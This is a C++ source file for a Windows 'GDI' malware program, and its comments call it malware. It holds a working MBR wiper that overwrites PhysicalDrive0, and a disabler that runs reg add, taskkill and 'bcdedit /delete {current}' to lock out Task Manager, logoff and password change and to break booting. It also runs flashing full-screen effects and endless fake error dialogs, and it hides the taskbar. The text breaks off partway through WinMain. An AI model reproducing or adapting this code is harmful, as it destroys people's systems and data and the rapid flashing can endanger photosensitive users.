#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "Msimg32.lib")
#include <math.h>
#include <time.h>
#include <cmath>
#include "ClientCheck.h"
#include "data.h"
#include "Anti-crash.h"
#include "BootConfig.h"
#define M_PI   3.14159265358979323846264338327950288
#define PI     3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}


DWORD WINAPI shader1(LPVOID lpvd) { // credits to Soheil Shahrab, modified by you
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;

	// Initialize direction and timing variables
	int direction = 1;  // 1 = Up, -1 = Down
	DWORD lastDirectionChange = GetTickCount();
	DWORD directionChangeInterval = 5000; // 5 seconds

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				FLOAT fx = ((x + (10 * i)) ^ y) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i += direction;  // Move the fractal up or down depending on direction

						 // Check if it's time to change direction
		DWORD currentTime = GetTickCount();
		if (currentTime - lastDirectionChange >= directionChangeInterval) {
			direction = -direction;  // Reverse the direction
			lastDirectionChange = currentTime;  // Reset the timer
		}

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader2(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;

	srand(time(0));  // Seed the random number generator

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		// Create Rainbow Flash Effect
		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				RGBQUAD rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);

				// Create a fast-changing rainbow flash effect
				hslcolor.h = fmod(i / 100.0f, 1.0f);  // Rapidly cycle through hues to create rainbow effect
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		// Add the shaking effect by randomly altering the window's position
		int shakeX = rand() % 21 - 10;  // Random value between -10 and 10
		int shakeY = rand() % 21 - 10;  // Random value between -10 and 10
		SetWindowPos(GetConsoleWindow(), HWND_TOP, shakeX, shakeY, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE);

		// Increment the fractal generation for continuous change
		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);

		Sleep(10);  // Add a small delay for smooth animation
	}

	return 0x00;
}

DWORD WINAPI plgblt(LPVOID lpParam)
{
	HDC hdc = GetDC(0);
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 3;
		wPt[0].y = wRect.top - 6;
		wPt[1].x = wRect.right + 4;
		wPt[1].y = wRect.top + 5;
		wPt[2].x = wRect.left - 6;
		wPt[2].y = wRect.bottom + 9;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader3(LPVOID lpstart) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	BITMAPINFO bmpi = { 0 };
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	HBITMAP bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	float hue = 0.0f;  // Start with the red hue
	const float hueStep = 0.01f;  // Hue step to create the rainbow effect

	while (1) {
		// Create rainbow effect by cycling through hues
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				RGBQUAD rgbquadCopy = rgbquad[index];

				// Convert RGB to HSL, modify the hue to create the rainbow effect
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(hue, 1.0f);  // Cycle hue value between 0 and 1
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		// Apply the rainbow colors to the screen
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);

		// Increase hue to shift through colors
		hue += hueStep;
		if (hue >= 1.0f) hue = 0.0f;  // Reset the hue if it exceeds 1

		Sleep(10);  // Delay to control the speed of the rainbow transition
	}

	ReleaseDC(NULL, hdc);
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}

DWORD WINAPI shader4(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;

	while (1)
	{
		if ((rand() % 2) == 0) InvalidateRect(0, 0, 0);
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Alternate between red and white colors based on a random condition
				if ((rand() % 2) == 0) {
					// Set to white
					rgbquad[index].rgbRed = 255;
					rgbquad[index].rgbGreen = 255;
					rgbquad[index].rgbBlue = 255;
				}
				else {
					// Set to red
					rgbquad[index].rgbRed = 255;
					rgbquad[index].rgbGreen = 0;
					rgbquad[index].rgbBlue = 0;
				}
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
		Sleep(200);  // Delay to control the speed of the red/white flash
	}
	return 0x00;
}

DWORD WINAPI shake(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		// Increase the random displacements to intensify the shake effect
		int shakeIntensity = 5; // This is the increased intensity

								// BitBlt with random offsets, now within the range of -5 to +5
		BitBlt(hdc, rand() % (shakeIntensity * 2) - shakeIntensity, rand() % (shakeIntensity * 2) - shakeIntensity,
			w, h, hdc, rand() % (shakeIntensity * 2) - shakeIntensity, rand() % (shakeIntensity * 2) - shakeIntensity, SRCCOPY);

		Sleep(10);  // Delay between shake movements
		ReleaseDC(0, hdc);
	}
	return 0x00;
}

DWORD WINAPI shader5(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				// Set red based on x and green based on y
				rgbquad[index].rgbRed = x;         // Red channel will increase as x increases
				rgbquad[index].rgbGreen = y;       // Green channel will increase as y increases
				rgbquad[index].rgbBlue = 0;        // No blue component, set to 0
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI shader6(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		// Use SRCAND to darken instead of brightening
		BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);


		Sleep(1);
		ReleaseDC(0, hdc);
	}
}

DWORD WINAPI shader7(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int rainbowCycle = 0;

	while (1) {
		HDC hdc = GetDC(0);

		// Shift the screen content upwards (top shift)
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, SRCCOPY);  // Move content up by 30 pixels

														// White brush to merge
		HBRUSH brush1 = CreateSolidBrush(RGB(255, 255, 255));
		SelectObject(hdc, brush1);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, MERGECOPY);
		DeleteObject(brush1);

		// Rainbow color generation
		int r = (sin(rainbowCycle * 0.1) + 1) * 127; // Red
		int g = (sin(rainbowCycle * 0.1 + 2) + 1) * 127; // Green
		int b = (sin(rainbowCycle * 0.1 + 4) + 1) * 127; // Blue

		HBRUSH brush2 = CreateSolidBrush(RGB(r, g, b));
		SelectObject(hdc, brush2);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT); // Invert colors
		DeleteObject(brush2);

		// Increment the rainbowCycle to change the colors gradually
		rainbowCycle++;

		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI shader8(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int rainbowCycle = 0;

	while (1) {
		HDC hdc = GetDC(0);

		// Create a solid color for the flashy effect
		int r = (sin(rainbowCycle * 0.1) + 1) * 127; // Red
		int g = (sin(rainbowCycle * 0.1 + 2) + 1) * 127; // Green
		int b = (sin(rainbowCycle * 0.1 + 4) + 1) * 127; // Blue

		HBRUSH brush2 = CreateSolidBrush(RGB(r, g, b));
		SelectObject(hdc, brush2);

		// Fill the entire screen with the flashy color
		Rectangle(hdc, 0, 0, w, h);  // Paint the screen with the color

		DeleteObject(brush2);

		// Increment the rainbowCycle to change the colors gradually
		rainbowCycle++;

		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI lastly(LPVOID lpParam) 
{
	POINT wPt[3];
	RECT wRect;
	int rainbowCycle = 0; 
	while (1)
	{
		HDC hdc = GetDC(0);
		HDC hdcMem = CreateCompatibleDC(hdc);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, bm);
		GetWindowRect(GetDesktopWindow(), &wRect);
		int c = 10;

		// Randomize triangle points
		wPt[0].x = wRect.left + rand() % 11 - 5;
		wPt[0].y = wRect.top + rand() % 21 - 10;

		wPt[1].x = wRect.right + rand() % 21 - 10;
		wPt[1].y = wRect.top + rand() % 41 - 20;

		wPt[2].x = wRect.left + c - rand() % 21 - c;
		wPt[2].y = wRect.bottom - c + rand() % 21 - c;

		// Capture part of the screen and apply triangle transformation
		PlgBlt(hdcMem, wPt, hdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);

		// Rainbow color generation
		int r = (sin(rainbowCycle * 0.1) + 1) * 127; // Red
		int g = (sin(rainbowCycle * 0.1 + 2) + 1) * 127; // Green
		int b = (sin(rainbowCycle * 0.1 + 4) + 1) * 127; // Blue

														 // Create a rainbow brush
		HBRUSH rainbowBrush = CreateSolidBrush(RGB(r, g, b));
		SelectObject(hdc, rainbowBrush);

		// Invert colors of the selected area
		BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, PATINVERT);

		// Clean up brushes and memory
		DeleteObject(rainbowBrush);
		DeleteObject(hdcMem);
		DeleteObject(bm);
		ReleaseDC(0, hdc);

		// Increment the rainbow cycle counter
		rainbowCycle++;

		// Small delay before next iteration
		Sleep(10);
	}
}


void WINAPI sound1() { 
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * (t&t >> 5 ^ 10) ^ 15 & (t >> 10));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}


void WINAPI sound2() { 
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(~t + (t ^ (t >> 6)) * 5);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(~t * 100 + (t^t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(5 * (t + t >> 5)*(t + t) + t >> 10);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16025, 16025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[16025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t + (t&t^t >> 6) + (t&t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8025, 8025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t - (t + t >> 5) + (t^t >> 5));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void WINAPI sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8025, 8025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t ^ (t + t >> 7)&t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}


void WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8025, 8025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*(t >> 6));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8025, 8025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t*(t >> 10 | t >> 12) * t >> 15);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

DWORD WINAPI last(LPVOID lpParam)
{
	CreateDirectoryA("C:\\GoodbyeForever", 0);
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"C:\\GoodbyeForever\\data.wav", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(hDevice, data, 236366, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(hDevice);

	// Use PlaySound to play the sound
	PlaySound(L"C:\\GoodbyeForever\\data.wav", NULL, SND_FILENAME | SND_ASYNC);

	return 0;
}


DWORD WINAPI Fake1(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"The program can't start because byebye.dll is missing from your computer. Try reinstalling the program to fix this problem.", L"System Error", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI goodbye(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"Have you ever felt something is gonna happen?", L"?", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI goodbye1(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"But i know.", L"?", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI goodbye2(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, L"Goodbye.", L"?", MB_ICONERROR);
	}
	return 0;
}

DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}
DWORD WINAPI notaskbar(LPVOID lpvd)
{
	static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
	ShowWindow(hShellWnd, SW_HIDE);
	return 666;
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	if (!hasRunBefore()) {
		if (MessageBoxW(NULL, L"Run Malware?", L"lGyciQRsgA.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		if (MessageBoxW(NULL, L"Are you sure? It will erase your PC. (Set date to 1/1/2038)", L"Last Warning.", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
	}
	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	sound1();
	Sleep(30000);
	TerminateThread(thread1, 0);
	CloseHandle(thread1);
	InvalidateRect(0, 0, 0);
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	HANDLE thread2dot1 = CreateThread(0, 0, plgblt, 0, 0, 0);
	sound2();
	Sleep(30000);
	TerminateThread(thread2, 0);
	CloseHandle(thread2);
	InvalidateRect(0, 0, 0);
	TerminateThread(thread2dot1, 0);
	CloseHandle(thread2dot1);
	InvalidateRect(0, 0, 0);
	HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
	sound3();
	Sleep(30000);
	TerminateThread(thread3, 0);
	CloseHandle(thread3);
	InvalidateRect(0, 0, 0);
	HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
	HANDLE thread4dot1 = CreateThread(0, 0, shake, 0, 0, 0);
	sound4();
	Sleep(30000);
